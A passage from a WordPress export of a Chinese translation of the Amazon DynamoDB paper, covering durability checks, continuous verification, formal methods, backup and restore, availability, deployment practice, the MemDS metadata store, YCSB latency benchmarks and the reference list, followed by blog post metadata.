<p>因此，通过日志副本快速修复受影响的复制组可以确保写入具有的高持久性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="52-%E9%9D%99%E9%BB%98%E6%95%B0%E6%8D%AE%E9%94%99%E8%AF%AF">5.2 静默数据错误</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一些硬件故障会导致存储数据错误[5,7]。根据我们的经验，这些错误可能发生在存储媒介、CPU或内存[5]。不幸的是，这些错误很难检测到，因为它们可能发生在系统的任何地方。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB使用大量的<strong>checksums（checksums）</strong>&nbsp;来检测静默错误。DynamoDB在每个日志条目、消息和日志文件中维护checksums，以验证两个节点间每次数据传输的完整性。这些checksums防止错误扩散到系统其他部分。<strong>因为这些消息在到达目的地之前可能要经过各个层的转换，需要计算节点或组件之间的每个消息checksums并进行验证</strong>，如果没有这些检查，任何一层都可能引入静默错误。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>归档到S3的每个日志文件都有一个清单，包含关于日志的信息，比如表、分区以及日志文件中存储的数据的开始和结束标记。负责将日志文件归档到S3的<strong>代理（agent）</strong>&nbsp;在上传数据之前执行各种检查，包括(但不限于)：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>验证每个日志条目以确保它属于正确的表和分区</li><li>验证checksums以检测静默错误</li><li>验证日志文件的序列号中没有任何漏洞</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>所有检查都通过，日志文件和清单就会被归档。复制组的所有三个副本上都运行一个日志归档代理。如果某个代理发现日志文件已经被归档过，就会将已归档的文件下载下来和本地的预写日志进行比较，以验证数据的完整性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>所有日志文件和清单文件，连同内容的checksums被上传到S3。<strong>执行put操作时S3会对内容checksums进行检查</strong>，防止数据传输到S3期间出现错误。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="53-%E6%8C%81%E7%BB%AD%E9%AA%8C%E8%AF%81">5.3 持续验证</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB还会持续地验证静态数据。我们的目的是检测系统中出现的静默数据错误或比特衰变（bit rot：指存储在存储介质中的数据的性能和完整性缓慢恶化。这个持续验证过程类似于<strong>擦拭（scrub）</strong>&nbsp;。Scrub的目标是检测出意料之外的错误，例如比特衰变。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Scrub过程运行并验证两件事：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>复制组中三个副本的数据相同</li><li>线上副本数据与使用归档的预写日志条目离线构建的副本数据相匹配</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>使用归档的日志构建副本的过程会在5.5节解释。验证过程先计算活动副本的checksums，然后将其与S3中归档的日志条目生成的快照进行匹配。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Scrub机制可以作为深层防御，用于检测线上存储副本与通过建表时日志构建的副本之间的差异。这些全面的检查极大提高了系统运行的可信度。类似的持续验证技术也用于验证全局表（global table）的副本。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>这些年来我们已经认识到对静态数据进行持续验证是防止硬件故障、静默数据损坏甚至软件bug的最可靠方法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="54-%E8%BD%AF%E4%BB%B6%E9%94%99%E8%AF%AF">5.4 软件错误</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB是一个构建在复杂基座上的分布式键值存储。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>高度的复杂性增加了设计、编码和运维中出现人为错误的概率。系统中的错误可能导致数据丢失、损坏或违反其它我们对客户保证的接口契约。我们广泛地使用形式化方法[16]来确保复制协议的正确性。<strong>核心的复制协议使用TLA+[12,13]进行规范。在添加影响复制协议的新特性时，会将其合并到规范和模型检查中。</strong>&nbsp;模型检查使我们在代码投入生产之前找出可能导致持久性和正确性问题的微小bug。S3[6]等其他服务也发现模型检查在类似的场景中很有用。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>我们还采用了大量的故障注入测试和压力测试，确保部署的每一个软件的正确性。除了在数据平面（data plane）测试和验证复制协议外，我们还使用形式化方法来验证控制平面（control plane）和分布式事务等特性的正确性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="55-%E5%A4%87%E4%BB%BD%E5%92%8C%E6%81%A2%E5%A4%8D">5.5 备份和恢复</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>除了防止物理介质损坏之外，DynamoDB还支持备份和恢复，以防止客户应用程序中由于bug导致的逻辑损坏。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>由于通过归档在S3中的预写日志构建，备份或恢复不会影响表的性能或可用性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>备份可以在多个分区间保持一致，时间范围是直到上一秒。备份是DynamoDB表的完整副本，存储在Amazon S3 bucket中，可以在任意时刻将备份数据恢复到新的DynamoDB表。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB还支持<strong>时间点恢复（point-in-time restore，简称PITR）</strong>。通过时间点恢复，客户可以将过去35天内任何时间点的表内容恢复到同一区域（Region）的不同DynamoDB表。如果一张表启用了时间点恢复，DynamoDB会定期创建该表的分区快照并上传到S3，分区快照的创建周期由该分区累积的预写日志数量决定。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通过快照与预写日志实现时间点恢复。在收到对表进行时间点恢复的请求后，DynamoDB为表的所有分区找到距离请求时间最近的快照，重放恢复请求中的时间戳之前的日志，然后创建表的快照并恢复它。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="6-%E5%8F%AF%E7%94%A8%E6%80%A7">6 可用性</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了实现高可用性，DynamoDB表在一个地区的多个可用域（Availability Zone）之间分布和复制。<strong>DynamoDB定期测试节点、机架和可用域的故障恢复能力。</strong>&nbsp;例如，想测试服务整体的可用性和持久性，对其进行关机测试；使用仿真流量，通过作业调度器随机关闭节点。在所有关机测试结束后，通过测试工具将验证存储在数据库中的数据在逻辑上是有效且没有损坏的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>本节将详细介绍过去十年中为确保高可用性解决的一些挑战。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="61-%E5%86%99%E5%92%8C%E4%B8%80%E8%87%B4%E6%80%A7%E8%AF%BB%E5%8F%AF%E7%94%A8%E6%80%A7">6.1 写和一致性读可用性</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>分区的写可用性取决于是否具有健康的leader和合法的写仲裁（write quorum）。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在DynamoDB中，<strong>合法的写仲裁需要来自不同可用域的三个副本中的两个参与。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>只要有一个主副本和足够多的健康副本参加写仲裁，分区就处于可用状态。</li><li>如果副本数量小于举行仲裁所需的最少节点数，则该分区无法写入。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>如果其中一个副本没有响应，则leader向组中添加一个日志副本（log replica）。</strong>&nbsp;添加日志副本是确保写仲裁始终可用的最快方法，最小化由于不合法的写仲裁而对写可用性造成的中断。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Leader副本提供一致性读取。</strong>&nbsp;引入日志副本对系统来说是一个很大的改变，经过形式化证明的Paxos实现让我们能放心地对系统进行调整和试验，以实现更高的可用性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>我们已经能够在一个带有日志副本的区域（Region）中运行数百万个Paxos组。最后任何副本都可以提供一致的读取。如果leader副本故障，其他副本检测到它的故障，并选举一个新的leader，以尽量减少一致性读取的中断。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="62-%E6%95%85%E9%9A%9C%E6%A3%80%E6%B5%8B">6.2 故障检测</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>新当选的leader必须等就leader的租约到期后才能提供流量服务。虽然这只是几秒钟的时间，但当选的leader在这段时间无法接受新的写入或一致的读取流量，因此破坏了可用性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>高可用性系统的关键组件之一是对leader的故障检测。</strong>&nbsp;故障检测必须快速而可靠，尽量减少中断。错误检测中的误报可能会导致可用性的更多中断。当组内每个副本都与leader失去连接时，故障检测运行效果很好。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>但是，节点可能会遇到<strong>灰色网络故障（gray network failure）</strong>。灰色网络故障可能是由于leader和follower之间存在通信问题、节点的出站/入站通信问题或前端路由器与leader之间存在通信问题，而事实上leader和follower可以相互通信。灰色故障会破坏可用性，因为在故障检测中存在假阳性或没有检测到故障。例如，某个副本没接收到leader的心跳包（heartbeats），就会尝试选举一个新的leader，如上一节所述，这会破坏可用性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了解决灰色故障导致的可用性问题，试图触发故障切换的follower向复制组中的其他副本发送消息，询问它们是否可以与leader通信，如果收到leader健康的响应消息，则follower将不再举行leader选举。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB所使用改进版故障检测算法极大减少了误报的数量，从而减少了无效的leader选举。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="63-%E6%B5%8B%E9%87%8F%E5%8F%AF%E7%94%A8%E6%80%A7">6.3 测量可用性</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB是为<strong>全局表99.999%达到可用性</strong>和<strong>区域表99.99%达到可用性</strong>设计的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>可用性以每5分钟为间隔，计算DynamoDB成功处理请求的百分比。</strong>&nbsp;为了确保达到这些目标，DynamoDB持续监控服务和表级别的可用性。监控得到的可用性数据用于分析客户感知的可用性趋势，并在客户感知的错误超过某个阈值时触发警报，这些警报称为面向客户的警报(customer-facing alarms，简称CFA)。CFA报告任何与可用性相关的问题，并主动地进行自动修复或通过操作员干预缓解问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>除了实时跟踪之外，系统还运行触发性的日常聚合作业，计算每个客户的可用性聚合指标（aggregate availablity metrics）。将聚合结果上传到S3，以便定期分析可用性趋势。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB还可以从客户端观测可用性并发出警报。有两组客户端专门用于测量用户感知（user-perceived）的可用性。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>第一组客户端是使用DynamoDB作为数据存储的Amazon内部服务，这些服务共享它们的软件所观察到的DynamoDB API调用的可用性指标。</li><li>第二组客户端是DynamoDB金丝雀程序。这些程序在区域（Region）中的每个可用域上运行，并通过所有公共端点（endpoint）与DynamoDB通信。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>真实的应用程序流量使我们能够推断出客户感知到的DynamoDB可用性和延迟，并排查出灰色故障[10,11]。经它们能很好地反映客户可能或正在经历的长期和短期趋势。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="64-%E9%83%A8%E7%BD%B2">6.4 部署</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>与传统的关系数据库不同，DynamoDB负责部署，不需要维护窗口且不会影响客户体验的性能和可用性。进行软件部署的原因有很多，包括新特性、bug修复和性能优化，通常需要更新大量服务。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB定时推送软件更新。部署将软件从一种状态转换为另一种状态。<strong>部署的新软件要经过一个完整的开发和测试周期，才能认为代码是正确可信的。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>多年来，通过多次部署，DynamoDB已经认识到重要的不仅仅是结束状态和开始状态。<strong>有时候新部署的软件可能无法工作需要回滚，回滚后状态可能与软件的初始状态不同。</strong>&nbsp;测试中回滚过程经常被忽略从而对客户造成影响。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>每次部署之前DynamoDB都会在组件级别上运行一套升级和降级测试。</strong>&nbsp;然后，对软件进行有目的的回滚，然后运行功能测试进行测试。DynamoDB发现这个过程有助于排查问题，否则在需要时很难回滚。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在单个节点上部署软件与在多个节点上部署软件有很大的不同。<strong>部署在分布式系统中不是原子的（atomic），在任何给定的时间都会有软件在一些节点上运行旧代码，在集群的其他部分运行新代码。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>分布式部署的另一个挑战是，<strong>新软件可能会引入一种新的消息类型或者更改了协议使得系统中的旧软件无法理解。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB通过<strong>读写部署（read-write deployment）</strong>&nbsp;处理这类更改。读写部署是一个多步骤的过程：</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>第一步是部署软件来读取新的消息格式或协议。</li><li>一旦所有节点都能处理新消息，软件就会更新以发送新消息。</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>通过软件部署也可以启用新消息。读写部署使两种类型的消息可以在系统中共存。即使经过回滚，系统也可以同时理解新旧两种消息。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>所有部署都是先在一小部分节点上完成，然后再将它们部署到整个集群节点上。这样的策略降低了部署错误的潜在影响。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB为可用性指标的设置了告警阈值，如果部署期间的错误率或延迟超过阈值，系统将触发自动回滚。部署到存储节点的软件会触发不影响可用性的leader故障转移：Leader副本直接放弃领导权，新的leader不需要等待旧leader的租约到期。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="65-%E5%A4%96%E9%83%A8%E6%9C%8D%E5%8A%A1%E4%BE%9D%E8%B5%96">6.5 外部服务依赖</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了确保高可用性，<strong>请求路径（request path）中DynamoDB依赖的所有服务的可用性都应该比DynamoDB更高，或者DynamoDB应该能够在所依赖的服务故障时继续运行。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB请求路径依赖的服务包括AWS Identity和Access Management Service(IAM)[2]，以及使用客户密钥加密表的AWS Key Management(AWS KMS)[3]。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB使用IAM和AWS KMS对每个客户请求进行身份验证。虽然这些服务具有高可用性，但DynamoDB的设计使它能够在这些服务不可用时继续运行，且不会牺牲这些系统提供的任何安全性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在使用IAM和AWS KMS的情况下，DynamoDB采用一个稳定的静态设计[18]，即使一个依赖挂掉，整个系统仍能保持工作。系统可能看不到该依赖项原本应该交付的更新信息。虽然依赖挂掉了，但挂掉之前存下的信息还可以继续使用。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB在对每个请求进行身份验证的请求路由器中缓存来自IAM和AWS KMS的结果。<strong>DynamoDB定期异步刷新缓存的结果。</strong>&nbsp;即使IAM或KMS不可用，路由器仍将在预设的一段时间内继续使用缓存的结果，向没有缓存结果的请求路由器发送操作的客户机会受到影响。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>然而，在实践中当AWS KMS或IAM挂掉时我们发现只会产生很小的影响。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>此外，<strong>缓存可以消除对下层的调用（off-box call）从而改善响应时间，在系统处于高负载时这点非常有用。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="66-%E5%85%83%E6%95%B0%E6%8D%AE%E5%8F%AF%E7%94%A8%E6%80%A7">6.6 元数据可用性</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>请求路由器中最重要的元数据是<strong>表的主键到存储节点之间的映射</strong>。启动时DynamoDB将元数据存储在DynamoDB中。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>路由信息（routing information）</strong>&nbsp;包括表的所有分区、每个分区的键范围以及承载该分区的存储节点。当路由器收到一个它从未见过的表的请求时，它会下载整个表的路由信息并缓存到本地。关于分区副本的配置信息很少更改，因此缓存命中率大约有99.75%。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>引入缓存带来的问题是会导致<strong>双峰行为（bimodal behavior）</strong>。在请求路由器有缓存为空的冷启动（cold start）情况下，每个DynamoDB请求都需要查找元数据，对应的服务的请求处理速度必须与DynamoDB的请求处理速度相匹配。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>我们观测到向请求路由器集群增加新容量时，受此影响元数据服务的流量会飙升到75%. 因此,引入新请求路由器会影响性能，并可能导致系统不稳定。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>此外，无效的缓存可能会引发系统其他部分的级联故障（cascading failure），因为数据源无法承受更多的直接负载[4]。（Dynamo的一次更新中引入了一个bug，使元数据服务无法及时响应存储节点的查询请求，导致大量重复的元数据查询，影响了集群中的大片节点。）</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB希望消除并显著减少请求路由器和其他元数据客户端对本地缓存的依赖，同时不影响客户请求的延迟。在处理请求时路由器只需要请求的Key所在的分区信息，因此获取整个表的路由信息是一种浪费，特别是那些有许多分区的大型表。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了以低成本的方式降低元数据扩张和可用性风险，<strong>DynamoDB构建了一个名为MemDS的内存分布式数据存储。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>MemDS将所有元数据存储在内存中，并在MemDS集群中进行复制。对MemDS进行水平扩展以处理DynamoDB的所有传入请求率。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>数据被高度压缩。节点上的MemDS进程封装了<strong>Perkle数据结构</strong>，它是Patricia树[17]和Merkle树的混合。Perkle树可以插入键和关联值，然后使用完整键或键前缀进行查找。此外，由于键按顺序存储，因此也支持如<code>lessThan</code>、<code>greaterThan</code>和<code>between</code>这样的范围查询。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>MemDS的Perkle树还另外支持两种特殊的查找操作：<code>floor</code>和<code>ceiling</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><code>floor</code>接受一个键，并从Perkle返回一个存储的条目，该条目的键小于或等于给定的键。</li><li><code>ceiling</code>与此类似，但返回键大于或等于给定键的条目。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>在每个请求路由器主机上部署新的分区映射缓存，以避免原始请求路由缓存中出现的双峰现象。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>在新的缓存中，即使缓存命中也会MemDS异步访问元数据服务以刷新缓存。</strong>&nbsp;因此不管缓存命中率如何，新的缓存使MemDS集群始终以恒定的流量提供服务。传统缓存的后端流量由缓存命中率决定，与传统缓存相比，MemDS集群流向元数据集群的恒定流量增加了负载，但避免了在缓存失效时将故障级联到系统的其他部分。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB存储节点是分区成员数据（partitin membership data，节点上分区的分配情况称为&nbsp;<strong>“membership.”</strong>[4]）的权威来源。<strong>存储节点将分区成员更新信息推送到MemDS</strong>，每个分区成员的更新会传播到所有MemDS节点。如果MemDS提供的分区成员信息失效，那么访问到的错误存储节点要么响应最新的成员信息（如果它知道的情况下），要么响应一个错误代码，触发请求路由器查找另一个MemDS。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="7-%E5%BE%AE%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95">7 微基准测试</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了<strong>证明伸缩性不会影响应用程序感受到的延迟</strong>，我们运行了类型A（50%读取和50%更新）和B（95%读取以及5%的更新）两种YCSB[8]测试。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>这两个基准测试都使用了均匀的键分布，条目大小为900字节。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>测试在北弗吉尼亚地区的DynamoDB上运行，工作负载从每秒10万个操作扩大到每秒100万个操作。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>图5展示了两次测试中读延迟的50百分位和99百分位。该图表明，**即使在不同的吞吐量下，DynamoDB读延迟的差异也很小。**即使工作负载的吞吐量增加，读延迟仍然相同。工作负载B的读吞吐量是工作负载A的两倍，但延迟的差异仍然很小。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>图6展示了两个工作负载的写延迟的50百分位和99百分位。与读延迟一样，<strong>无论工作负载的吞吐量如何变化，写延迟始终保持平稳。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在进行YCSB测试时，负载A产生的吞吐量高于负载B，但两者测量出来的写延迟基本相同。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220829203615.png" alt="图5：YCSB读延迟"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220829203708.png" alt="图6：YCSB写延迟"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":1} -->
<h1 id="8-%E7%BB%93%E8%AE%BA">8 结论</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB开创了云原生NoSQL数据库领域。它是成千上万个应用程序的关键组成部分，每天应用于衣食住行各个领域。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>开发人员通过它来扩展数据工作负载，同时提供稳定的性能、高可用性和低操作复杂性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>十多年来，DynamoDB一直维护着这些关键特性，并通过一些革新性的特性(如按需容量、时间点备份和恢复、多区域复制和原子事务)吸引了众多开发者。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">参考文献</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1] Amazon SimpleDB: Simple Database Service.&nbsp;<a href="https://aws.amazon.com/simpledb/">https://aws.amazon.com/simpledb/</a>.<br>[2] AWS Identity and Account Management Service.&nbsp;<a href="https://aws.amazon.com/iam/">https://aws.amazon.com/iam/</a>.<br>[3] AWS Key Management Service.&nbsp;<a href="https://aws.amazon.com/kms/">https://aws.amazon.com/kms/</a>.<br>[4] Summary of the amazon dynamodb service disrution and related impacts in the us-east region. 2015.&nbsp;<a href="https://aws.amazon.com/message/5467D2/">https://aws.amazon.com/message/5467D2/</a>.<br>[5] L. N. Bairavasundaram, A. C. Arpaci-Dusseau, R. H. Arpaci-Dusseau, G. R. Goodson, and B. Schroeder. An analysis of data corruption in the storage stack. ACM Transactions on Storage (TOS), 4(3):1–28, 2008.<br>[6] J. Bornholt, R. Joshi, V . Astrauskas, B. Cully, B. Kragl, S. Markle, K. Sauri, D. Schleit, G. Slatton, S. Tasiran, J. V an Geffen, and A. Warfield. Using lightweight formal methods to validate a key-value storage node in amazon s3. In Proceedings of the ACM SIGOPS 28th Symposium on Operating Systems Principles, SOSP ’21, page 836–850, New Y ork, NY , USA, 2021. Association for Computing Machinery.<br>[7] C. Constantinescu, I. Parulkar, R. Harper, and S. Michalak. Silent data corruption—myth or reality? In 2008 IEEE International Conference on Dependable Systems and Networks With FTCS and DCC (DSN), pages 108–1. IEEE, 2008.<br>[8] B. F. Cooper, A. Silberstein, E. Tam, R. Ramakrishnan, and R. Sears. Benchmarking cloud serving systems with ycsb. In Proceedings of the 1st ACM symposium on Cloud computing, pages 143–154, 2010.<br>[9] G. DeCandia, D. Hastorun, M. Jampani, G. Kakulapati, A. Lakshman, A. Pilchin, S. Sivasubramanian, P . V osshall, and W. V ogels. Dynamo: Amazon’s highly available key-value store. SIGOPS Oper . Syst. Rev., 41(6):205–220, oct 2007.<br>[10] T. Hauer, P . Hoffmann, J. Lunney, D. Ardelean, and A. Diwan. Meaningful availability. In 17th {USENIX} Symposium on Networked Systems Design and Implementation ({NSDI} 20), pages 545–557, 2020.<br>[11] P . Huang, C. Guo, L. Zhou, J. R. Lorch, Y . Dang, M. Chintalapati, and R. Y ao. Gray failure: The achilles’heel of cloud-scale systems. In Proceedings of the 16th Workshop on Hot Topics in Operating Systems, pages 150–155, 2017.<br>[12] L. Lamport. Specifying systems, volume 388. Addison-Wesley Boston, 2002.<br>[13] L. Lamport. The pluscal algorithm language. In International Colloquium on Theoretical Aspects of Computing, pages 36–60. Springer, 2009.<br>[14] L. Lamport et al. Paxos made simple. ACM Sigact News, 32(4):18–25, 2001.<br>[15] C. Mohan, D. Haderle, B. Lindsay, H. Pirahesh, and P . Schwarz. Aries: A transaction recovery method supporting fine-granularity locking and partial rollbacks using write-ahead logging. ACM Transactions on Database Systems (TODS), 17(1):94–162, 1992.<br>[16] C. Newcombe, T. Rath, F. Zhang, B. Munteanu, M. Brooker, and M. Deardeuff. How amazon web services uses formal methods. Communications of the ACM, 58(4):66–73, 2015.<br>[17] K. Sklower. A tree-based packet routing table for berkeley unix. In USENIX Winter, volume 1991, pages 93–99. Citeseer, 1991.<br>[18] B. Weiss and M. Furr. Static stability using availability zones.&nbsp;<a href="https://aws.amazon.com/builders-library/static-stability-using-availability-zones/">https://aws.amazon.com/builders-library/static-stability-using-availability-zones/</a>.</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[本文介绍了Amazon在大规模环境下运行DynamoDB的经验，以及该架构如何不断发展以满足客户不断增长的工作负载需求。]]></excerpt:encoded>
		<wp:post_id>473</wp:post_id>
		<wp:post_date><![CDATA[2022-09-01 10:06:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-09-01 02:06:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-09-01 20:57:25]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-09-01 12:57:25]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%af%91%e6%96%87amazon-dynamodb-a-scalable-predicably-performant-and-fully-managed-nosql-database-service]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e5%88%86%e5%b8%83%e5%bc%8f%e7%b3%bb%e7%bb%9f"><![CDATA[分布式系统]]></category>
		<category domain="post_tag" nicename="%e5%88%86%e5%b8%83%e5%bc%8f%e7%b3%bb%e7%bb%9f"><![CDATA[分布式系统]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b3%bb%e7%bb%9f"><![CDATA[数据库系统]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[474]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53958ae40]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
